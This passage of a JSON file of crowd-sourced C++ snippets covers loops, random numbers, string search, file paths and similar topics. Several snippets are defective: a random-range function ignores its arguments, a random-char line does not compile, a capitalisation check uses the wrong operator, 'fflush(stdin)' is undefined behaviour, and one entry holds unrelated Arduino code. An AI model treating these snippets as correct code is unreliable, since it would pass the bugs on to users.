    "description": "auto it = std::find_if( sortList.begin(), sortList.end(),     [&User](const std::pair<std::string, int>& element){ return element.first == User.name;} ); \n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 885,
    "keyword": null,
    "link": null,
    "title": " c++ find number of divisors",
    "description": " // https://www.geeksforgeeks.org/count-divisors-n-on13/ int countDivisors(int n) {      int cnt = 0;      for (int i = 1; i <= sqrt(n); i++) {          if (n % i == 0) {              // If divisors are equal,              // count only one              if (n / i == i)                  cnt++;                 else // Otherwise count both                  cnt = cnt + 2;          }      }      return cnt;  } \n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 886,
    "keyword": null,
    "link": null,
    "title": " c++ find object in vector by attribute",
    "description": "std::vector<Type> v = ....; std::string myString = ....; auto it = find_if(v.begin(), v.end(), [&myString](const Type& obj) {return obj.getName() == myString;})  if (it != v.end()) {   // found element. it is an iterator to the first matching element.   // if you really need the index, you can also get it:   auto index = std::distance(v.begin(), it); }\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 887,
    "keyword": null,
    "link": null,
    "title": " c++ find prime numbers",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\n#include <iostream>   using namespace std;   int main()   {     int n, i, m=0, flag=0;     cout << \"Enter the Number to check Prime: \";     cin >> n;     m=n/2;     for(i = 2; i <= m; i++)     {         if(n % i == 0)         {             cout<<\"Number is not Prime.\"<<endl;             flag=1;             break;         }     }     if (flag==0)         cout << \"Number is Prime.\"<<endl;     return 0;   }  \n#include <iostream> using namespace std;  int main() {     int i, n;     bool isPrime = true;      cout << \"Enter a positive integer: \";     cin >> n;      // 0 and 1 are not prime numbers     if (n == 0 || n == 1) {         isPrime = false;     }     else {         for (i = 2; i <= n / 2; ++i) {             if (n % i == 0) {                 isPrime = false;                 break;             }         }     }     if (isPrime)         cout << n << \" is a prime number\";     else         cout << n << \" is not a prime number\";      return 0; } \n// 6k+-1 optimisation bool is_prime6(int num) {   int i;   if (num == 1)     return false;   if (num <= 3)     return true;   if (num % 2 == 0 || num % 3 == 0)     return false;   if (num < 25)     return true;   for (i = 5; i * i <= num; i += 6)     if (num % i == 0 || num % (i + 2) == 0)       return false;   return true; }\n",
    "reg_date": "2021-10-12T11:37:59.000Z"
  },
  {
    "id": 888,
    "keyword": null,
    "link": null,
    "title": " c++ find string in string",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\nconst char* c = \"Word\"; string str = \"WhereIsMyWordThatINeed\"; cout << \"the word is at index \" << str.find(c); //this will print \"the word is at index 9\"\n#include <iostream> #include <string> #include <algorithm> #include <functional>  int main() {     std::string in = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit,\"                      \" sed do eiusmod tempor incididunt ut labore et dolore magna aliqua\";     std::string needle = \"pisci\";     auto it = std::search(in.begin(), in.end(),                    std::boyer_moore_searcher(                        needle.begin(), needle.end()));     if(it != in.end())         std::cout << \"The string \" << needle << \" found at offset \"                   << it - in.begin() << '\\n';     else         std::cout << \"The string \" << needle << \" not found\\n\"; }\nIf not found then returns npos or -1 in int\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 889,
    "keyword": null,
    "link": null,
    "title": " c++ find with predicat",
    "description": "if(find_if(table.begin(), table.end(), [&new_id](const entry &arg) {                                             return arg.first == new_id; }) != ...)\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 890,
    "keyword": null,
    "link": null,
    "title": " c++ findpattern",
    "description": "int CompareByteArray(PBYTE ByteArray1, PCHAR ByteArray2, PCHAR Mask, DWORD Length){    DWORD nextStart = 0;    char start = ByteArray2[0];    for (DWORD i = 0; i < Length; i++)    {        if (Mask[i] == '?')        {            continue;        }        if (ByteArray1[i] == start)        {            nextStart = i;        }        if (ByteArray1[i] != (BYTE)ByteArray2[i])        {            return nextStart;        }    }    return -1;} PBYTE FindSignature(LPVOID BaseAddress, DWORD ImageSize, PCHAR Signature, PCHAR Mask){    PBYTE Address = NULL;    PBYTE Buffer = (PBYTE) BaseAddress;     DWORD Length = strlen(Mask);     for (DWORD i = 0; i < (ImageSize - Length); i++)    {        int result = CompareByteArray((Buffer + i), Signature, Mask, Length);        if (result < 0)        {            Address = (PBYTE)BaseAddress + i;            break;        }        else        {            i += result;        }    }     return Address;}\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 891,
    "keyword": null,
    "link": null,
    "title": " c++ first index 0 or 1",
    "description": "Arrays are indexed starting at 0, as opposed to starting at 1. The first element of the array above is vector[0]. The index to the last value in the array is the array size minus one.\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 892,
    "keyword": null,
    "link": null,
    "title": " c++ first letter of string",
    "description": "#include <iostream> #include <string>  int main()  {   string str{};     // creating string   getline(cin, str);// using getline for user input   std::cout << str; // output string namePerson   if (str[0] >= 'a' || str[0] <= 'z')     str[0] -= 32;   return (0); }\n// string::at #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for (unsigned i=0; i<str.length(); ++i)   {     std::cout << str.at(i);   }   return 0; }\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 893,
    "keyword": null,
    "link": null,
    "title": " c++ fizzbuzz",
    "description": "// a short fizzbuzz, can make smaller by removing spaces #include <iostream>  int i; int main() { for (auto &o=std::cout; ++i < 101; o<<'\\n')     i%3? o :  o << \"Fizz\",     i%5? i%3? o << i :o : o << \"Buzz\"; }\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 894,
    "keyword": null,
    "link": null,
    "title": " c++ float array zero",
    "description": "float arr1[10] = { };       // all elements are 0 float arr2[10] = { 0 };     // all elements are 0 float arr3[10] = { 1 };     // first element is 1, all others are 0 float arr4[10] = { 1, 2 };  // first element is 1, second is 2, all others are 0\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 895,
    "keyword": null,
    "link": null,
    "title": " c++ flush stdin",
    "description": "fflush(stdin);\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 896,
    "keyword": null,
    "link": null,
    "title": " c++ for",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\nfor (statement 1; statement 2; statement 3) {   // code block to be executed } //Statement 1 is executed (one time) before the execution of the code block.  //Statement 2 defines the condition for executing the code block.  //Statement 3 is executed (every time) after the code block has been executed.  //The example below will print the numbers 0 to 4:  Example for (int i = 0; i < 5; i++) {   cout << i << \"\\n\"; }\n#include <iostream> #define FOR(i,a) for (int i = 0; i < a; i++)  FOR(i, 3) cout << i << endl;\n//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp    loop c++C++ By Zearz on Feb 25 2020 for (int i = 0; i < 5; i++) {   cout << i << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:38:00.000Z"
  },
  {
    "id": 897,
    "keyword": null,
    "link": null,
    "title": " c++ for competitive programming",
    "description": "// here is a template for competitive programming #include <bits/stdc++.h> using namespace std;  int main() { \tios_base::sync_with_stdio(false); \tcin.tie(0);    \t// write your code here }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 898,
    "keyword": null,
    "link": null,
    "title": " c++ for loop",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\n   for (int i = 0; i < 10; i++){   //Do something as long as i is less than 10,    //In that case it will loop 10 times   //use break; to restart the loop whenever you want to cancel the loops.   cout << i;      //at the end, remember i will be increased by 1. }  //output 0123456789\n#include <iostream>  using namespace std;  int main(){     int i; //initialize integer   //i starts at 0 and stops at 4, as 5 is not < 5   for (i = 0; i < 5; i++){ //i++ means add 1 to i each iteration     cout << \"number \" + i << endl; //print 5 times   }   return 0; } //output: /* number 0 number 1 number 2 number 3 number 4 */\nfor (initialization; condition; update) {     // body of-loop  }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 899,
    "keyword": null,
    "link": null,
    "title": " c++ for loop multiple variables",
    "description": "for (int x=0, y=0 ; x < 10 && y < 10 ; x++, y++) {     // Your code here }\n// Need to initialize both x and y individually for(int x=0, y=0; x + y < z; x++, y++) { /* code */ }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 900,
    "keyword": null,
    "link": null,
    "title": " c++ for loop syntax",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\nfor(int i=0; i<=limit; i++) { \t//statement }\n#include <iostream>  using namespace std;  int main(){     int i; //initialize integer   //i starts at 0 and stops at 4, as 5 is not < 5   for (i = 0; i < 5; i++){ //i++ means add 1 to i each iteration     cout << \"number \" + i << endl; //print 5 times   }   return 0; } //output: /* number 0 number 1 number 2 number 3 number 4 */\n// There are 2 loops in ++ :  while(1==1){  } //    |  |   |  //     |   What happens while condition is true //     |     //    the condition   //for loop  for (int i; i < 10; i++){    } //   |___|  |___|   |_|  |__| //     |      |      |     |  //     |      |      |     what happens when conditons is true //     |      |     what happens each time loop is reapeted //     |      The condition in wich the loop is true //     a variable declaratoin\nfor(int i =0; i<6;++i){//initialize;condition;updation   cout<<i<<endl;//code block }//first it initializes, then checks the condition, then runs the code block and at last updates 'i'\n//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp    loop c++C++ By Zearz on Feb 25 2020 for (int i = 0; i < 5; i++) {   cout << i << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 901,
    "keyword": null,
    "link": null,
    "title": " c++ for loops",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\nfor (int i; i < 10; i++) {   cout << i << \"\\n\"; }\nfor ( int i = 0; i < 5; i++) {   cout << \"Hello\" << endl; } // prints hello 5 times. \n#include <iostream> #define FOR(i,a) for (int i = 0; i < a; i++)  FOR(i, 3) cout << i << endl;\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 902,
    "keyword": null,
    "link": null,
    "title": " c++ forbids comparison between pointer and integer",
    "description": "char a[2] defines an array of char's. a is a pointer to the memory at    the beginning of the array and using == won't actually compare the    contents of a with 'ab' because they aren't actually the same types,   'ab' is integer type. Also 'ab' should be \"ab\" otherwise you'll have    problems here too. To compare arrays of char you'd want to use strcmp.  Something that might be illustrative is looking at the typeid of 'ab':\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 903,
    "keyword": null,
    "link": null,
    "title": " c++ foreach vector",
    "description": "std::vector<Entity> entities;  for (Entity& entity : entities) { \tentity.doStuff();                 }\nfor(int i=0; i < size(vector); i++){    vector[i]=0; } \n// for_each example #include <iostream>     // std::cout #include <algorithm>    // std::for_each #include <vector>       // std::vector  void myfunction (int i) {  // function:   std::cout << ' ' << i; }  struct myclass {           // function object type:   void operator() (int i) {std::cout << ' ' << i;} } myobject;  int main () {   std::vector<int> myvector;   myvector.push_back(10);   myvector.push_back(20);   myvector.push_back(30);    std::cout << \"myvector contains:\";   for_each (myvector.begin(), myvector.end(), myfunction);   std::cout << '\\n';    // or:   std::cout << \"myvector contains:\";   for_each (myvector.begin(), myvector.end(), myobject);   std::cout << '\\n';    return 0; }\ntemplate<class InputIterator, class Function>   Function for_each(InputIterator first, InputIterator last, Function fn) {   while (first!=last) {     fn (*first);     ++first;   }   return fn;      // or, since C++11: return move(fn); }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 904,
    "keyword": null,
    "link": null,
    "title": " c++ formatting",
    "description": "cout << setw(10) << \"ten\" << \"four\" << \"four\" << '\\n'; // Display ten       fourfour  cout << setfill('-') << setw(80) << \"-\" << '\\n'; // Displays 80 \"-\"\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 905,
    "keyword": null,
    "link": null,
    "title": " c++ freecodecamp course 10 hours youtube",
    "description": "int analogPin = 3;// potentiometer wiper (middle terminal) connected to analog pin 3  int val = 0; // variable to store the read value  void setup() {    Serial.begin(9600); // setup serial    analogReference(EXTERNAL); // the voltage applied to the AREF pin (0 to 5V only)        // is used as the reference. }  void loop() {    val = analogRead(analogPin); // read the input pin    Serial.println(val); // debug value }\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 906,
    "keyword": null,
    "link": null,
    "title": " c++ fstream create if not exists",
    "description": "file.open(\"test.txt\",fstream::out);\n",
    "reg_date": "2021-10-12T11:38:01.000Z"
  },
  {
    "id": 907,
    "keyword": null,
    "link": null,
    "title": " c++ function default argument",
    "description": "void point(int x = 3, int y = 4);   point(1,2); // calls point(1,2) point(1);   // calls point(1,4) point();    // calls point(3,4)\n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 908,
    "keyword": null,
    "link": null,
    "title": " c++ function overload",
    "description": "/*A function over load in c++ is when you take a function with the same definition but change the input variables.   This can include multiple functions with the same name see below   */ #include <iostream> using namespace std;  int function1(int var1){//example of single variable \t//do somthing } int function1(int var1,int var2){//of overload \t//do somthing\t } int function1(int var1,string var3){//of overload \t//do somthing\t }  int main(){     cout << \"Hello World\" << endl;   function1(4);   function1(3,-90);   function1(34,\"it works\");//these should all work even tho they have different input variables   return 0; } \t\n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 909,
    "keyword": null,
    "link": null,
    "title": " c++ function return array",
    "description": "#include <iostream>  using namespace std;     int* fun()  {      int* arr = new int[100];         /* Some operations on arr[] */     arr[0] = 10;      arr[1] = 20;         return arr;  }     int main()  {      int* ptr = fun();      cout << ptr[0] << \" \" << ptr[1];      return 0;  } \nint * fillarr(int arr[], int length){    for (int i = 0; i < length; ++i){       // arr[i] = ? // do what you want to do here    }    return arr; }  // then where you want to use it. int main(){ int arr[5]; int *arr2;  arr2 = fillarr(arr, 5);  } // at this point, arr & arr2 are basically the same, just slightly // different types.  You can cast arr to a (char*) and it'll be the same. \n#include <iostream> #include <ctime>  using namespace std;  // function to generate and retrun random numbers. int * getRandom( ) {     static int  r[10];     // set the seed    srand( (unsigned)time( NULL ) );        for (int i = 0; i < 10; ++i) {       r[i] = rand();       cout << r[i] << endl;    }     return r; }  // main function to call above defined function. int main () {     // a pointer to an int.    int *p;     p = getRandom();        for ( int i = 0; i < 10; i++ ) {       cout << \"*(p + \" << i << \") : \";       cout << *(p + i) << endl;    }     return 0; }\n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 910,
    "keyword": null,
    "link": null,
    "title": " c++ function return pointer to itself",
    "description": "// To some free-function struct func_wrap {     using f_t = func_wrap(*)();     f_t func;     f_t operator()() const noexcept { return func; }     operator f_t() const noexcept { return func; } };  using func_t = func_wrap(*)();  // Function to wrap func_wrap foo() { return func_wrap{foo}; }  func_t bar() { return foo(); } func_t buz() { return foo()(); }  // Some functor struct function {    function operator()() const noexcept    {        return function();    } };  function foo(int) { return function(); } function bar(int) { return function()(); } function buz(int) { return function()()(); } \n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 911,
    "keyword": null,
    "link": null,
    "title": " c++ functions dynamic vector",
    "description": "void FreeMemory(string *&v) {     if (v != nullptr) {         delete[] v;         v = nullptr;     }  }  void AssignMemory(string *&v, int n) {     if (v != nullptr) {         FreeMemory(v);             }     if (n>=0) {         v = new string[n];     } } \n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 912,
    "keyword": null,
    "link": null,
    "title": " c++ functions inside functions",
    "description": "int main() {     // This declares a lambda, which can be called just like a function     auto print_message = [](std::string message)      {          std::cout << message << \"\\n\";      };      // Prints \"Hello!\" 10 times     for(int i = 0; i < 10; i++) {         print_message(\"Hello!\");      } } \n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 913,
    "keyword": null,
    "link": null,
    "title": " c++ garbage collection",
    "description": "// raii.cpp  #include <iostream> #include <new> #include <string>  class ResourceGuard{   private:     const std::string resource;   public:     ResourceGuard(const std::string& res):resource(res){       std::cout << \"Acquire the \" << resource << \".\" <<  std::endl;     }     ~ResourceGuard(){       std::cout << \"Release the \"<< resource << \".\" << std::endl;     } };  int main(){    std::cout << std::endl;    ResourceGuard resGuard1{\"memoryBlock1\"};    std::cout << \"\\nBefore local scope\" << std::endl;   {     ResourceGuard resGuard2{\"memoryBlock2\"};   }   std::cout << \"After local scope\" << std::endl;      std::cout << std::endl;       std::cout << \"\\nBefore try-catch block\" << std::endl;   try{       ResourceGuard resGuard3{\"memoryBlock3\"};       throw std::bad_alloc();   }      catch (std::bad_alloc& e){       std::cout << e.what();   }   std::cout << \"\\nAfter try-catch block\" << std::endl;      std::cout << std::endl;  } \n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 914,
    "keyword": null,
    "link": null,
    "title": " c++ generate all subsets",
    "description": "#include <vector> #include <iostream> #include <cmath> using namespace std;  int main() { \t// this is the length of the array of values \t// change variable \"len\" accordingly \tint len = 5; \t// this is the array of values \tint values[] = {3, 4, 2, 8, 5}; \t \t// all subsets will be in vector \"subsets\" \tvector<vector<int>> subsets; \tfor (int i = 0; i < pow(2, len); i++) { \t\tint t = i; \t\tvector<int> v; \t\tfor (int j = 0; j < len; j++) { \t\t\tif (t & 1) \t\t\t\tv.push_back(values[j]); \t\t\tt >>= 1; \t\t} \t\tsubsets.push_back(v); \t}  \t// print all of the subsets (optional) \tcout << \"subsets:\\n\"; \tfor (const vector<int>& subset: subsets) { \t\tfor (const int& value: subset) \t\t\tcout << value << \" \"; \t\tcout << \"\\n\"; \t} \t// note: an empty line will be printed at the top, \t// indicating an empty subset } \n#include <iostream> #include <vector> #include <algorithm> using namespace std;   // Function to print the elements of a vector void printVector(vector<int> const &out) {     for (int i: out)         cout << i << \" \";     cout << '\\n'; }   // Recursive function to print all distinct subsets of S // S    --> input set // out  --> vector to store subset // i    --> index of next element in set S to be processed void findPowerSet(int S[], vector<int> &out, int i) {     // if all elements are processed, print the current subset     if (i < 0)     {         printVector(out);         return;     }       // include current element in the current subset and recur     out.push_back(S[i]);     findPowerSet(S, out, i - 1);       // exclude current element in the current subset     out.pop_back(); // backtrack       // remove adjacent duplicate elements     while (S[i] == S[i-1])         i--;       // exclude current element in the current subset and recur     findPowerSet(S, out, i - 1); }   // Program to generate all distinct subsets of given set int main() {     int S[] = { 1, 3, 1 };     int n = sizeof(S) / sizeof(S[0]);       // sort the set     sort(S, S + n);       // create an empty vector to store elements of a subset     vector<int> out;     findPowerSet(S, out, n-1);       return 0; } \n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 915,
    "keyword": null,
    "link": null,
    "title": " c++ generate random char",
    "description": "char cch = 'a' + rand()&;\n",
    "reg_date": "2021-10-12T11:38:02.000Z"
  },
  {
    "id": 916,
    "keyword": null,
    "link": null,
    "title": " c++ generate random number",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h>      #include <time.h>  using namespace std;  int main() { \tint num; \tsrand(time(0)); \t\tnum = rand() % 10 + 1; \t\tcout << num << endl; } \n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} }\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 917,
    "keyword": null,
    "link": null,
    "title": " c++ generate random number upper and lower bound",
    "description": "int randomBetween( int lowerBound, int upperBound ) {   int upperbound, lowerbound;   int randomBetween = rand() % (upperbound-lowerbound) + upperbound;   return randomBetween; } \n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 918,
    "keyword": null,
    "link": null,
    "title": " c++ generate random numbers",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n#include <iostream>  #include <ctime>  #include <cstdlib>  using namespace std;  int main()  {      srand((unsigned)time(0));      int random_integer;      int lowest=1, highest=10;      int range=(highest-lowest)+1;      for(int index=0; index<20; index++){          random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));          cout << random_integer << endl;      }  }\n/*The problem with srand(time(NULL)) and rand() is that if you use them in a loop it'll probably be executed during the same clock period and therefore rand() will return the same number. To solve this you can use the library random to help you.*/  #include <random>  std::random_device rd; std::mt19937 e{rd()}; std::uniform_int_distribution<int> dist{1, 5}; //Limits of the interval //Returns a random number between {1, 5} with dist(e);\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 919,
    "keyword": null,
    "link": null,
    "title": " c++ generate random numbers in range",
    "description": "int range = max - min + 1; int num = rand() % range + min; \n#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tint start = 3; \t\tint end = 8; \t\tcout << start + rand() % (end - start + 1); \t} }\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 920,
    "keyword": null,
    "link": null,
    "title": " c++ generic pointer",
    "description": "void*  gp;    //generic pointer int*  ip;     //int pointer char*  cp;    //char pointer  gp = ip;      //legal conversion ip = static_cast<int*>(gp); //explicit cast required                             //in C++ but not in C cp = ip;      //illegal conversion *ip = 15;     //legal dereference of pointer to int *ip = *gp;    //illegal generic pointer dereference \n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 921,
    "keyword": null,
    "link": null,
    "title": " c++ get ascii value of char",
    "description": "//It is almost know to everybody , how to print an ASCII code of a character. #include <bits/stdc++.h> using namespace std; int main() { \tint var=65; \tcout<<(char)var<<endl; //By this way, you can get the character with that mentioned ASCII code. \treturn 0; }\n#include<iostream> using namespace std; int main () {     char c;     cout << \"Enter a character : \";     cin >> c;     cout << \"ASCII value of \" << c <<\" is :  \" << (int)c;     return 0; }\n#include<iostream.h> #include<conio.h> void main() {   char a;   clrscr();   cout<<\"\\nEnter any key: \";   cin>>a;   cout<<\"ASCII value of \"<<a<<\" is: \"<<int(a);   getch(); }\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 922,
    "keyword": null,
    "link": null,
    "title": " c++ get cursor position console",
    "description": "COORD GetConsoleCursorPosition(HANDLE hConsoleOutput) {     CONSOLE_SCREEN_BUFFER_INFO cbsi;     if (GetConsoleScreenBufferInfo(hConsoleOutput, &cbsi))     {         return cbsi.dwCursorPosition;     }     else     {         // The function failed. Call GetLastError() for details.         COORD invalid = { 0, 0 };         return invalid;     } } \nPOINT p; if (GetCursorPos(&p)) {     //cursor position now in p.x and p.y }\n#include <windows.h> int main() {    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);    COORD pos = {3, 6};    SetConsoleCursorPosition(hConsole, pos);    WriteConsole(hConsole, \"Hello\", 5, NULL, NULL);    return 0;}\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 923,
    "keyword": null,
    "link": null,
    "title": " c++ get data type",
    "description": "#include <typeinfo> ... cout << typeid(variable).name() << endl;\n#include <typeinfo> ... cout << typeid(variable).name() << endl; \n// Example std::cout << \"Data-type = \" << typeid(YourVariable).name() << \"\\n\";    // Syntax typeid(YourVariable).name()\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 924,
    "keyword": null,
    "link": null,
    "title": " c++ get environment variable",
    "description": "#include <stdlib.h>   int main() {   std::string pathVar = getenv(\"PATH\");   return 0; }\n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 925,
    "keyword": null,
    "link": null,
    "title": " c++ get extension",
    "description": "#include <iostream> #include <string> using namespace std;  string GetFileExtension(string Filename) {    size_t LastDot = Filename.find_last_of(\".\");     if (LastDot == string::npos)    {       return \"\"; // No extension in Filename string    }     return Filename.substr(LastDot); }\nAll C++ header extensions: .c , .h , .hpp , .hxx , .cpp , .hh C++ file (items / source code): .cpp , .cc , .cxx \n",
    "reg_date": "2021-10-12T11:38:03.000Z"
  },
  {
    "id": 926,
    "keyword": null,
    "link": null,
    "title": " c++ get file content",
    "description": "#include <fstream> #include <string>  int main(int argc, char** argv) {    std::ifstream ifs(\"myfile.txt\");   std::string content( (std::istreambuf_iterator<char>(ifs) ),                        (std::istreambuf_iterator<char>()    ) );    return 0; } \n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 927,
    "keyword": null,
    "link": null,
    "title": " c++ get file extension",
    "description": "#include <iostream> #include <string> using namespace std;  string GetFileExtension(string Filename) {    size_t LastDot = Filename.find_last_of(\".\");     if (LastDot == string::npos)    {       return \"\"; // No extension in Filename string    }     return Filename.substr(LastDot); }\nAll C++ header extensions: .c , .h , .hpp , .hxx , .cpp , .hh C++ file (items / source code): .cpp , .cc , .cxx \n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 928,
    "keyword": null,
    "link": null,
    "title": " c++ get filename from path",
    "description": "// get filename std::string base_filename = full_path.substr(full_path.find_last_of(\"/\\\\\") + 1);  // remove extension from filename std::string::size_type const p(base_filename.find_last_of('.')); std::string file_without_extension = base_filename.substr(0, p);\n// The GetFilenameFromFullpath function does the job  #include <iostream> using namespace std;  string GetFilenameFromFullpath(string Filepath, bool IncludeExtension) {     // Remove folder path     string Filename = Filepath.substr(Filepath.find_last_of(\"/\\\\\") + 1);      if (IncludeExtension == false)     {         // Remove extension         string Extension = GetFileExtension(Filename);         Filename = Filename.substr(0,Filename.length() - Extension.length());     }          return Filename; }  string GetFileExtension(string Filename) {    size_t LastDot = Filename.find_last_of(\".\");     if (LastDot == string::npos)    {       return \"\"; // No extension in Filename string    }     return Filename.substr(LastDot); }\n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 929,
    "keyword": null,
    "link": null,
    "title": " c++ get files in directory",
